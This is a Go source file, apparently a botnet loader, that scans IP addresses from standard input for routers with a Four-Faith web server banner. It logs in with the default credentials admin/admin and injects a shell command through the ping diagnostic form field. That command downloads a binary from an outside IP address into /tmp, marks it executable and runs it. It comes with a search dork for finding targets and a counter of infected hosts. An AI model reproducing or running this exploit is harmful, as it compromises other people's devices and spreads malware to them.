package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	syncWait                            sync.WaitGroup
	statusAttempted, statusFound, total int
)

/*
	Dork: html:SWRXgoodPacket=0
*/

func zeroByte(a []byte) {
	for i := range a {
		a[i] = 0
	}
}

func sendLogin(target string) int {

	data := url.Values{}
	endpoint := "http://" + target + "/apply.cgi"
	data.Set("submit_button", "Ping")
	data.Set("action", "ApplyTake")
	data.Set("submit_type", "start")
	data.Set("del_value", "")
	data.Set("change_action", "gozila_cgi")
	data.Set("next_page", "Diagnostics.asp")
	data.Set("ping_ip", "cd /tmp;wget http://149.57.171.148/mpsdljs -O mfu;chmod 777 mfu;./mfu faith.mpsl")

	client := &http.Client{}
	r, err := http.NewRequest("POST", endpoint, strings.NewReader(data.Encode()))
	if err != nil {
		return -1
	}

	r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	r.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))
	r.SetBasicAuth("admin", "admin")
	r.Header.Add("Origin", "http://"+target)
	r.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
	r.Header.Add("Sec-GPC", "1")
	r.Header.Add("Referer", endpoint)
	r.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9")
	//fmt.Println(data.Encode())
	res, err := client.Do(r)
	if err != nil {
		return -1
	}

	if res.StatusCode == 200 {
		statusFound++
		return 1
	}

	return 1
}

func checkDevice(target string, timeout time.Duration) int {

	var isGpon int = 0

	conn, err := net.DialTimeout("tcp", target, timeout*time.Second)
	if err != nil {
		return -1
	}
	conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
	conn.Write([]byte("GET / HTTP/1.0\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))

	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		conn.Close()
		return -1
	}

	if strings.Contains(string(bytebuf), "Server: httpd_four-faith") {
		statusAttempted++
		isGpon = 1
	}
	zeroByte(bytebuf)

	if isGpon == 0 {
		conn.Close()
		return -1
	}

	conn.Close()
	return 1
}

func processTarget(target string) {

	if checkDevice(target, 10) == 1 {
		sendLogin(target)
		return
	} else {
		return
	}
}

func main() {

	rand.Seed(time.Now().UTC().UnixNano())

	go func() {
		for {
			fmt.Printf("Total [%d] Found [%d] Login [%d]\r\n", total, statusAttempted, statusFound)

			time.Sleep(1 * time.Second)
		}
	}()

	for {
		r := bufio.NewReader(os.Stdin)
		scan := bufio.NewScanner(r)
		for scan.Scan() {
			if os.Args[1] == "manual" {
				go processTarget(scan.Text())
			} else {
				go processTarget(scan.Text() + ":" + os.Args[1])
			}

			total++
			syncWait.Add(1)
		}
	}
}
